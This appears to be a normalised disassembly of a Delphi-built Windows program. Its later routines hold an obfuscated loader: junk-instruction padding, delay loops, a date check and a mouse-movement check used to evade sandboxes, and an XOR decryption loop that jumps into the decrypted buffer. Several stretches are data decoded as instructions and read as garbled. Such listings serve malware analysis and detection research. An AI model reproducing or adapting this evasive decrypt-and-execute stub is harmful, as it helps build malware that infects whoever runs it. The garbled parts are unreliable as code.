push ecx
push ecx
push ebx
push esi
mov ebx edx
xor edx edx
push ebp
push j_sub_4038d0#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebx + 0x1c ]
cmp [ edx + 0x78 ] 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
cmp [ eax + 0x13a ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c80
mov eax [ ebp - 0xc ]
push eax
mov eax r-xdata
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x14 ]
xor ecx ecx
pop eax
call sub_408df4
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40425c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
mov esi eax
mov edx ebx
mov eax [ esi + 0x13c ]
call [ esi + 0x138 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e867
sub_47e8b0
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47ea09
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x1c ]
mov eax esi
cmp [ eax + 0x78 ] 0x1
jne r-xdata
mov eax [ esi + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x122 ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405c80
mov eax [ ebp - 0x28 ]
push eax
mov eax r-xdata
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x30 ]
xor ecx ecx
pop eax
call sub_408df4
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_40425c
mov edx [ ebp - 0x20 ]
mov eax [ esi + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
lea ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebx + 0x8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
call sub_407f4c
mov eax [ ebp - 0x8 ]
or edx 0xffffffff
call sub_4081f8
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ea10
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx 0x1
mov eax [ ebx + 0x8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
call sub_407f4c
mov eax [ ebp - 0x10 ]
or edx 0xffffffff
call sub_4081f8
inc eax
je r-xdata
lea ecx [ ebp - 0x18 ]
mov edx 0x1
mov eax [ ebx + 0x8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4081bc
push eax
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax [ ebx + 0x8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1c ]
call sub_4081bc
mov ecx eax
mov esi [ ebp - 0x4 ]
mov edx ebx
mov eax [ esi + 0x124 ]
call [ esi + 0x120 ]
jmp r-xdata
sub_47ea70
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push j_sub_4038d0#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x1c ]
cmp [ eax + 0x78 ] 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
cmp [ esi + 0x11a ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c80
mov eax [ ebp - 0x14 ]
push eax
mov eax r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
lea edx [ ebp - 0x1c ]
xor ecx ecx
pop eax
call sub_408df4
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40425c
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407f4c
mov eax [ ebp - 0x4 ]
or edx 0xffffffff
call sub_4081f8
mov ecx eax
mov edx ebx
mov eax [ esi + 0x11c ]
call [ esi + 0x118 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47eb58
sub_47eba0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4767cc
mov eax [ r-xdata ]
mov [ esi + 0xa8 ] eax
mov edx 0x6e
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ esi + 0x7c ]
mov eax [ eax + 0x10 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ esi + 0xf4 ]
mov eax [ eax + 0x10 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47ec3b
[ ebx ]
add [ eax ] al
add [ 0x20525245 ] ch
push ebx
outsd
jb r-xdata
add [ eax ] al
add esp 0xc
mov eax esi
pop esi
pop ebx
retn
jns r-xdata
mov eax esi
call sub_4034f0
and [ ebp + 0x6e ] dl
imul ebp [ esi + 0x6f ] 0x77
outsb
and [ ebx + 0x6f ] al
insd
insd
popad
outsb
add [ fs : ebx + 0x56 ] dl
call sub_403508
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4768a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
sub_47ec84
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_474c24
lea eax [ esi + 0x70 ]
call sub_403f50
mov [ esi + 0x78 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47ecc8
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_474cbc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_47ecf0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47ed15
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ed1c
retn
sub_47ed2c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
out dx eax
inc edi
add [ eax - 0x12 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 + 0x47 ] bl
add [ ebx + eax ] dh
add [ eax ] al
xchg esp eax
hlt
sub_47efe4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
xor eax eax
push ebp
push sub_47f3bc
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f3c3
retn
movss xmm7 xmm7
movss xmm0 xmm0
movss xmm4 xmm4
movss xmm6 xmm6
mov ebx 0x2507
mov eax eax
movss xmm2 xmm2
movss xmm5 xmm5
movss xmm0 xmm0
call GetCurrentThread
movss xmm1 xmm1
nop
xchg esi esi
movss xmm1 xmm1
mov edx edx
mov esi esi
mov edi edi
movss xmm0 xmm0
dec ebx
jne r-xdata
mov eax eax
movss xmm0 xmm0
movss xmm0 xmm0
movss xmm6 xmm6
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
movss xmm4 xmm4
movss xmm6 xmm6
mov eax eax
mov ecx ecx
push 0x0
push 0x0
call SetAbortProc
movss xmm3 xmm3
nop
movss xmm3 xmm3
movss xmm4 xmm4
call GetLastError
mov [ rw-data ] eax
mov edi edi
movss xmm2 xmm2
mov eax eax
mov ecx ecx
push rw-data
call GetLocalTime
mov ecx ecx
movss xmm5 xmm5
movss xmm1 xmm1
movss xmm1 xmm1
cmp [ rw-data ] 0x7e0
jae r-xdata
movss xmm0 xmm0
mov edx edx
movss xmm2 xmm2
movss xmm1 xmm1
jmp r-xdata
xchg edx edx
movss xmm0 xmm0
movss xmm6 xmm6
movss xmm2 xmm2
cmp [ rw-data ] 0x6
je r-xdata
mov eax eax
movss xmm0 xmm0
mov esi esi
mov ecx ecx
jmp r-xdata
mov ebx 0x14c8
movss xmm0 xmm0
movss xmm5 xmm5
mov eax eax
mov edi edi
jmp r-xdata
call GetCurrentThread
dec ebx
jne r-xdata
movss xmm3 xmm3
movss xmm1 xmm1
mov edi edi
movss xmm3 xmm3
movss xmm3 xmm3
mov eax eax
movss xmm0 xmm0
mov esi esi
xchg esi esi
mov edx edx
movss xmm7 xmm7
mov eax eax
movss xmm0 xmm0
movss xmm4 xmm4
xchg esi esi
mov eax eax
mov eax 0x1e611059
call sub_4026dc
mov esi eax
mov edx edx
movss xmm6 xmm6
mov edx edx
movss xmm0 xmm0
test esi esi
je r-xdata
movss xmm7 xmm7
movss xmm3 xmm3
movss xmm4 xmm4
movss xmm6 xmm6
mov ebx 0x1
mov ecx ecx
movss xmm6 xmm6
movss xmm0 xmm0
movss xmm5 xmm5
lea eax [ ebx + 0x1 ]
mov ecx 0xdf
xor edx edx
div ecx
mov eax esi
add eax ebx
mov [ eax ] dl
mov edx edx
mov ecx ecx
mov edx edx
movss xmm2 xmm2
inc ebx
cmp ebx 0x1e610beb
jne r-xdata
mov ecx ecx
movss xmm5 xmm5
mov edi edi
mov eax esi
call sub_4026fc
movss xmm4 xmm4
movss xmm7 xmm7
movss xmm4 xmm4
mov esi esi
mov ebx 0x8ddb
call GetCurrentThread
dec ebx
jne r-xdata
xor ebx ebx
xchg esi esi
movss xmm5 xmm5
mov edi edi
movss xmm5 xmm5
push rw-data
call GetCursorPos
xchg ecx ecx
movss xmm0 xmm0
movss xmm7 xmm7
mov ecx ecx
mov ecx ecx
mov ebx ebx
mov esi esi
movss xmm2 xmm2
push 0x1d
call sub_40637c
mov edx edx
mov eax eax
mov edi edi
mov eax eax
cmp ebx 0x8
jbe r-xdata
movss xmm1 xmm1
mov esi esi
movss xmm0 xmm0
inc ebx
movss xmm2 xmm2
movss xmm6 xmm6
xchg edi edi
mov ecx ecx
mov eax [ edi ]
mov [ rw-data ] eax
xchg esi esi
movss xmm2 xmm2
mov ebx ebx
movss xmm1 xmm1
mov eax eax
movss xmm0 xmm0
mov ecx ecx
movss xmm6 xmm6
push edi
call GetCursorPos
movss xmm6 xmm6
mov edi edi
movss xmm1 xmm1
mov esi esi
mov eax [ edi ]
sub eax [ rw-data ]
cmp eax 0x14
jbe r-xdata
movss xmm5 xmm5
movss xmm3 xmm3
mov ebx ebx
mov eax 0x64da
call sub_4026dc
mov [ rw-data ] eax
mov esi esi
movss xmm2 xmm2
movss xmm6 xmm6
xchg ecx ecx
cmp [ rw-data ] 0x0
jne r-xdata
movss xmm2 xmm2
mov edx edx
mov edx edx
xchg edx edx
mov edx rw-data
mov ecx 0x5eb9
mov eax [ rw-data ]
call sub_406ad8
mov ebx ebx
xchg esi esi
mov esi esi
mov ecx ecx
xor ebx ebx
movss xmm7 xmm7
movss xmm0 xmm0
mov edi edi
jmp r-xdata
mov eax [ rw-data ]
add eax ebx
mov dl [ rw-data ]
xor [ eax ] dl
inc ebx
cmp ebx 0x5eba
jne r-xdata
movss xmm5 xmm5
mov ebx ebx
movss xmm3 xmm3
movss xmm6 xmm6
mov edx edx
movss xmm5 xmm5
movss xmm6 xmm6
mov ecx ecx
movss xmm2 xmm2
mov ebx ebx
movss xmm5 xmm5
mov eax eax
xor esi esi
movss xmm1 xmm1
mov eax eax
movss xmm6 xmm6
xchg edx edx
add esi [ rw-data ]
xchg edi edi
movss xmm6 xmm6
movss xmm4 xmm4
mov ecx ecx
xchg edi esi
movss xmm3 xmm3
movss xmm2 xmm2
mov edi edi
mov esi esi
add edi 0x5ee
xchg edx edx
mov edx edx
xchg edx edx
push edi
movss xmm0 xmm0
mov ecx ecx
mov edi edi
mov ebx ebx
retn
sub_47f084
xchg esi esi
movss xmm4 xmm4
movss xmm4 xmm4
movss xmm4 xmm4
movss xmm6 xmm6
mov eax eax
mov ecx ecx
push 0x0
push 0x0
call SetAbortProc
movss xmm3 xmm3
nop
movss xmm3 xmm3
movss xmm4 xmm4
call GetLastError
mov [ rw-data ] eax
mov edi edi
movss xmm2 xmm2
mov eax eax
mov ecx ecx
push rw-data
call GetLocalTime
mov ecx ecx
movss xmm5 xmm5
movss xmm1 xmm1
movss xmm1 xmm1
cmp [ rw-data ] 0x7e0
jae r-xdata
xchg edx edx
movss xmm0 xmm0
movss xmm6 xmm6
movss xmm2 xmm2
cmp [ rw-data ] 0x6
je r-xdata
mov eax eax
movss xmm0 xmm0
mov esi esi
mov ecx ecx
jmp r-xdata
mov ebx 0x14c8
movss xmm0 xmm0
movss xmm5 xmm5
mov eax eax
mov edi edi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f3c3
retn
call GetCurrentThread
dec ebx
jne r-xdata
movss xmm3 xmm3
movss xmm1 xmm1
mov edi edi
movss xmm3 xmm3
movss xmm3 xmm3
mov eax eax
movss xmm0 xmm0
mov esi esi
xchg esi esi
mov edx edx
movss xmm7 xmm7
mov eax eax
movss xmm0 xmm0
movss xmm4 xmm4
xchg esi esi
mov eax eax
mov eax 0x1e611059
call sub_4026dc
mov esi eax
mov edx edx
movss xmm6 xmm6
mov edx edx
movss xmm0 xmm0
test esi esi
je r-xdata
movss xmm7 xmm7
movss xmm3 xmm3
movss xmm4 xmm4
movss xmm6 xmm6
mov ebx 0x1
mov ecx ecx
movss xmm6 xmm6
movss xmm0 xmm0
movss xmm5 xmm5
lea eax [ ebx + 0x1 ]
mov ecx 0xdf
xor edx edx
div ecx
mov eax esi
add eax ebx
mov [ eax ] dl
mov edx edx
mov ecx ecx
mov edx edx
movss xmm2 xmm2
inc ebx
cmp ebx 0x1e610beb
jne r-xdata
mov ecx ecx
movss xmm5 xmm5
mov edi edi
mov eax esi
call sub_4026fc
movss xmm4 xmm4
movss xmm7 xmm7
movss xmm4 xmm4
mov esi esi
mov ebx 0x8ddb
call GetCurrentThread
dec ebx
jne r-xdata
xor ebx ebx
xchg esi esi
movss xmm5 xmm5
mov edi edi
movss xmm5 xmm5
push rw-data
call GetCursorPos
xchg ecx ecx
movss xmm0 xmm0
movss xmm7 xmm7
mov ecx ecx
mov ecx ecx
mov ebx ebx
mov esi esi
movss xmm2 xmm2
push 0x1d
call sub_40637c
mov edx edx
mov eax eax
mov edi edi
mov eax eax
cmp ebx 0x8
jbe r-xdata
movss xmm1 xmm1
mov esi esi
movss xmm0 xmm0
inc ebx
movss xmm2 xmm2
movss xmm6 xmm6
xchg edi edi
mov ecx ecx
mov eax [ edi ]
mov [ rw-data ] eax
xchg esi esi
movss xmm2 xmm2
mov ebx ebx
movss xmm1 xmm1
mov eax eax
movss xmm0 xmm0
mov ecx ecx
movss xmm6 xmm6
push edi
call GetCursorPos
movss xmm6 xmm6
mov edi edi
movss xmm1 xmm1
mov esi esi
mov eax [ edi ]
sub eax [ rw-data ]
cmp eax 0x14
jbe r-xdata
movss xmm5 xmm5
movss xmm3 xmm3
mov ebx ebx
mov eax 0x64da
call sub_4026dc
mov [ rw-data ] eax
mov esi esi
movss xmm2 xmm2
movss xmm6 xmm6
xchg ecx ecx
cmp [ rw-data ] 0x0
jne r-xdata
movss xmm2 xmm2
mov edx edx
mov edx edx
xchg edx edx
mov edx rw-data
mov ecx 0x5eb9
mov eax [ rw-data ]
call sub_406ad8
mov ebx ebx
xchg esi esi
mov esi esi
mov ecx ecx
xor ebx ebx
movss xmm7 xmm7
movss xmm0 xmm0
mov edi edi
jmp r-xdata
mov eax [ rw-data ]
add eax ebx
mov dl [ rw-data ]
xor [ eax ] dl
inc ebx
cmp ebx 0x5eba
jne r-xdata
movss xmm5 xmm5
mov ebx ebx
movss xmm3 xmm3
movss xmm6 xmm6
mov edx edx
movss xmm5 xmm5
movss xmm6 xmm6
mov ecx ecx
movss xmm2 xmm2
mov ebx ebx
movss xmm5 xmm5
mov eax eax
xor esi esi
movss xmm1 xmm1
mov eax eax
movss xmm6 xmm6
xchg edx edx
add esi [ rw-data ]
xchg edi edi
movss xmm6 xmm6
movss xmm4 xmm4
mov ecx ecx
xchg edi esi
movss xmm3 xmm3
movss xmm2 xmm2
mov edi edi
mov esi esi
add edi 0x5ee
xchg edx edx
mov edx edx
xchg edx edx
push edi
movss xmm0 xmm0
mov ecx ecx
mov edi edi
mov ebx ebx
retn
sub_47f0fa
xchg esi esi
movss xmm6 xmm6
xchg edx edx
movss xmm0 xmm0
movss xmm6 xmm6
movss xmm2 xmm2
cmp [ rw-data ] 0x6
je r-xdata
mov ebx 0x14c8
movss xmm0 xmm0
movss xmm5 xmm5
mov eax eax
mov edi edi
jmp r-xdata
call GetCurrentThread
dec ebx
jne r-xdata
movss xmm3 xmm3
movss xmm1 xmm1
mov edi edi
movss xmm3 xmm3
movss xmm3 xmm3
mov eax eax
movss xmm0 xmm0
mov esi esi
xchg esi esi
mov edx edx
movss xmm7 xmm7
mov eax eax
movss xmm0 xmm0
movss xmm4 xmm4
xchg esi esi
mov eax eax
mov eax 0x1e611059
call sub_4026dc
mov esi eax
mov edx edx
movss xmm6 xmm6
mov edx edx
movss xmm0 xmm0
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f3c3
retn
movss xmm7 xmm7
movss xmm3 xmm3
movss xmm4 xmm4
movss xmm6 xmm6
mov ebx 0x1
mov ecx ecx
movss xmm6 xmm6
movss xmm0 xmm0
movss xmm5 xmm5
lea eax [ ebx + 0x1 ]
mov ecx 0xdf
xor edx edx
div ecx
mov eax esi
add eax ebx
mov [ eax ] dl
mov edx edx
mov ecx ecx
mov edx edx
movss xmm2 xmm2
inc ebx
cmp ebx 0x1e610beb
jne r-xdata
mov ecx ecx
movss xmm5 xmm5
mov edi edi
mov eax esi
call sub_4026fc
movss xmm4 xmm4
movss xmm7 xmm7
movss xmm4 xmm4
mov esi esi
mov ebx 0x8ddb
call GetCurrentThread
dec ebx
jne r-xdata
xor ebx ebx
xchg esi esi
movss xmm5 xmm5
mov edi edi
movss xmm5 xmm5
push rw-data
call GetCursorPos
xchg ecx ecx
movss xmm0 xmm0
movss xmm7 xmm7
mov ecx ecx
mov ecx ecx
mov ebx ebx
mov esi esi
movss xmm2 xmm2
push 0x1d
call sub_40637c
mov edx edx
mov eax eax
mov edi edi
mov eax eax
cmp ebx 0x8
jbe r-xdata
movss xmm1 xmm1
mov esi esi
movss xmm0 xmm0
inc ebx
movss xmm2 xmm2
movss xmm6 xmm6
xchg edi edi
mov ecx ecx
mov eax [ edi ]
mov [ rw-data ] eax
xchg esi esi
movss xmm2 xmm2
mov ebx ebx
movss xmm1 xmm1
mov eax eax
movss xmm0 xmm0
mov ecx ecx
movss xmm6 xmm6
push edi
call GetCursorPos
movss xmm6 xmm6
mov edi edi
movss xmm1 xmm1
mov esi esi
mov eax [ edi ]
sub eax [ rw-data ]
cmp eax 0x14
jbe r-xdata
movss xmm5 xmm5
movss xmm3 xmm3
mov ebx ebx
mov eax 0x64da
call sub_4026dc
mov [ rw-data ] eax
mov esi esi
movss xmm2 xmm2
movss xmm6 xmm6
xchg ecx ecx
cmp [ rw-data ] 0x0
jne r-xdata
movss xmm2 xmm2
mov edx edx
mov edx edx
xchg edx edx
mov edx rw-data
mov ecx 0x5eb9
mov eax [ rw-data ]
call sub_406ad8
mov ebx ebx
xchg esi esi
mov esi esi
mov ecx ecx
xor ebx ebx
movss xmm7 xmm7
movss xmm0 xmm0
mov edi edi
jmp r-xdata
mov eax [ rw-data ]
add eax ebx
mov dl [ rw-data ]
xor [ eax ] dl
inc ebx
cmp ebx 0x5eba
jne r-xdata
movss xmm5 xmm5
mov ebx ebx
movss xmm3 xmm3
movss xmm6 xmm6
mov edx edx
movss xmm5 xmm5
movss xmm6 xmm6
mov ecx ecx
movss xmm2 xmm2
mov ebx ebx
movss xmm5 xmm5
mov eax eax
xor esi esi
movss xmm1 xmm1
mov eax eax
movss xmm6 xmm6
xchg edx edx
add esi [ rw-data ]
xchg edi edi
movss xmm6 xmm6
movss xmm4 xmm4
mov ecx ecx
xchg edi esi
movss xmm3 xmm3
movss xmm2 xmm2
mov edi edi
mov esi esi
add edi 0x5ee
xchg edx edx
mov edx edx
xchg edx edx
push edi
movss xmm0 xmm0
mov ecx ecx
mov edi edi
mov ebx ebx
retn
sub_47f128
xchg ecx ecx
mov ebx ebx
movss xmm1 xmm1
movss xmm7 xmm7
mov ebx 0x14c8
call GetCurrentThread
dec ebx
jne r-xdata
movss xmm3 xmm3
movss xmm1 xmm1
mov edi edi
movss xmm3 xmm3
movss xmm3 xmm3
mov eax eax
movss xmm0 xmm0
mov esi esi
xchg esi esi
mov edx edx
movss xmm7 xmm7
mov eax eax
movss xmm0 xmm0
movss xmm4 xmm4
xchg esi esi
mov eax eax
mov eax 0x1e611059
call sub_4026dc
mov esi eax
mov edx edx
movss xmm6 xmm6
mov edx edx
movss xmm0 xmm0
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f3c3
retn
movss xmm7 xmm7
movss xmm3 xmm3
movss xmm4 xmm4
movss xmm6 xmm6
mov ebx 0x1
mov ecx ecx
movss xmm6 xmm6
movss xmm0 xmm0
movss xmm5 xmm5
lea eax [ ebx + 0x1 ]
mov ecx 0xdf
xor edx edx
div ecx
mov eax esi
add eax ebx
mov [ eax ] dl
mov edx edx
mov ecx ecx
mov edx edx
movss xmm2 xmm2
inc ebx
cmp ebx 0x1e610beb
jne r-xdata
mov ecx ecx
movss xmm5 xmm5
mov edi edi
mov eax esi
call sub_4026fc
movss xmm4 xmm4
movss xmm7 xmm7
movss xmm4 xmm4
mov esi esi
mov ebx 0x8ddb
call GetCurrentThread
dec ebx
jne r-xdata
xor ebx ebx
xchg esi esi
movss xmm5 xmm5
mov edi edi
movss xmm5 xmm5
push rw-data
call GetCursorPos
xchg ecx ecx
movss xmm0 xmm0
movss xmm7 xmm7
mov ecx ecx
mov ecx ecx
mov ebx ebx
mov esi esi
movss xmm2 xmm2
push 0x1d
call sub_40637c
mov edx edx
mov eax eax
mov edi edi
mov eax eax
cmp ebx 0x8
jbe r-xdata
movss xmm1 xmm1
mov esi esi
movss xmm0 xmm0
inc ebx
movss xmm2 xmm2
movss xmm6 xmm6
xchg edi edi
mov ecx ecx
mov eax [ edi ]
mov [ rw-data ] eax
xchg esi esi
movss xmm2 xmm2
mov ebx ebx
movss xmm1 xmm1
mov eax eax
movss xmm0 xmm0
mov ecx ecx
movss xmm6 xmm6
push edi
call GetCursorPos
movss xmm6 xmm6
mov edi edi
movss xmm1 xmm1
mov esi esi
mov eax [ edi ]
sub eax [ rw-data ]
cmp eax 0x14
jbe r-xdata
movss xmm5 xmm5
movss xmm3 xmm3
mov ebx ebx
mov eax 0x64da
call sub_4026dc
mov [ rw-data ] eax
mov esi esi
movss xmm2 xmm2
movss xmm6 xmm6
xchg ecx ecx
cmp [ rw-data ] 0x0
jne r-xdata
movss xmm2 xmm2
mov edx edx
mov edx edx
xchg edx edx
mov edx rw-data
mov ecx 0x5eb9
mov eax [ rw-data ]
call sub_406ad8
mov ebx ebx
xchg esi esi
mov esi esi
mov ecx ecx
xor ebx ebx
movss xmm7 xmm7
movss xmm0 xmm0
mov edi edi
jmp r-xdata
mov eax [ rw-data ]
add eax ebx
mov dl [ rw-data ]
xor [ eax ] dl
inc ebx
cmp ebx 0x5eba
jne r-xdata
movss xmm5 xmm5
mov ebx ebx
movss xmm3 xmm3
movss xmm6 xmm6
mov edx edx
movss xmm5 xmm5
movss xmm6 xmm6
mov ecx ecx
movss xmm2 xmm2
mov ebx ebx
movss xmm5 xmm5
mov eax eax
xor esi esi
movss xmm1 xmm1
mov eax eax
movss xmm6 xmm6
xchg edx edx
add esi [ rw-data ]
xchg edi edi
movss xmm6 xmm6
movss xmm4 xmm4
mov ecx ecx
xchg edi esi
movss xmm3 xmm3
movss xmm2 xmm2
mov edi edi
mov esi esi
add edi 0x5ee
xchg edx edx
mov edx edx
xchg edx edx
push edi
movss xmm0 xmm0
mov ecx ecx
mov edi edi
mov ebx ebx
retn
sub_47f3ee
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4038d0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f416
retn
sub_47f41e
inc edi
add [ edi + ebx * 2 + 0x5f7c0040 ] ch
inc eax
add [ eax + 0x4c00405d ] ah
pop ebp
inc eax
add [ eax + 0x60 ] ch
inc eax
add [ eax ] bh
pushad
inc eax
add [ ebp + ebp * 2 + 0x40 ] al
add [ ebp * 2 + 0x6d7c0040 ] dl
inc eax
add [ ebp + ebp * 2 + 0x40 ] cl
add [ eax + 0x55 ] al
inc ecx
add [ eax ] dl
push ebp
inc ecx
add [ eax + esi * 2 + 0x70640040 ] dl
inc eax
add al dl
salc
inc eax
add [ eax - 0x2b ] dl
inc eax
add [ edi + ebx * 8 ] bh
inc eax
add [ edi + ebx * 8 ] cl
inc eax
add [ ebp + eax * 2 + 0x41 ] bl
add ah ah
inc esp
inc ecx
add [ eax ] bh
inc edi
inc ecx
add [ eax ] cl
inc edi
inc ecx
add al ch
push esp
inc ecx
add [ eax - 0x5bffbeac ] bl
and al [ edx ]
hlt
sub_47f511
or al [ ebx ]
pushad
or al [ ebx ]
test [ eax ] bh
inc esp
add [ eax + edi + 0x44 ] dl
add [ edx + edi * 4 + 0x42 ] cl
add [ edx + edi * 4 ] bl
inc edx
add [ eax + 0x540042ba ] dl
mov edx 0xcb040042
inc edx
add ah dl
0x42
sub_47f550
or cl 0x42
add [ eax - 0x37 ] dl
inc edx
add [ eax - 0x37 ] cl
inc edx
add [ eax ] bl
leave
inc edx
add [ eax ] ah
in eax dx
inc edx
add al bl
in al dx
inc edx
add [ eax + 0x400042ed ] cl
in eax dx
inc edx
add [ eax - 0x14 ] ah
inc edx
add [ eax ] ch
in al dx
inc edx
add [ eax - 0x77ffbd14 ] bh
in al dx
inc edx
add [ eax + 0x580042eb ] cl
jmp r-xdata
push 0x45
add [ eax - 0x47ffba96 ] ah
inc esi
inc esp
add [ eax + 0x46 ] al
inc esp
add [ eax + 0x780042bd ] ch
mov ebp 0xac500042
inc esi
add ah dh
stosd [ edi ]
inc esi
add [ eax - 0x48 ] ch
inc esi
add [ eax ] bh
mov eax 0xbb680046
inc esi
add [ eax ] bh
mov ebx 0xe82c0046
inc esi
add ah bh
out 0x46 eax
add [ eax + 0x500046cc ] cl
int3
sub_47f594
mov esp 0xf4004439
in eax dx
inc edx
add [ ebp + ebp * 8 - 0x11b3ffbe ] ah
inc edx
add ah bh
in eax dx
inc edx
add [ edx + ebp * 8 - 0x1573ffbe ] bh
inc edx
add [ eax + 0x400043dd ] bh
fld [ ebx ]
adc al 0xe8
inc ebx
add al dl
out 0x43 eax
add [ edi + edx * 2 + 0x45 ] al
add ah bl
push esi
inc ebp
add al dl
push 0x45
add [ eax - 0x47ffba96 ] ah
inc esi
inc esp
add [ eax + 0x46 ] al
inc esp
add [ eax + 0x780042bd ] ch
mov ebp 0xac500042
inc esi
add ah dh
stosd [ edi ]
inc esi
add [ eax - 0x48 ] ch
inc esi
add [ eax ] bh
mov eax 0xbb680046
inc esi
add [ eax ] bh
mov ebx 0xe82c0046
inc esi
add ah bh
out 0x46 eax
add [ eax + 0x500046cc ] cl
int3
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_47f418
call sub_405f38
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4696f4
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_46970c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46978c
call sub_403ddc
sub_40115f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405890
sub_401169
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4058a4
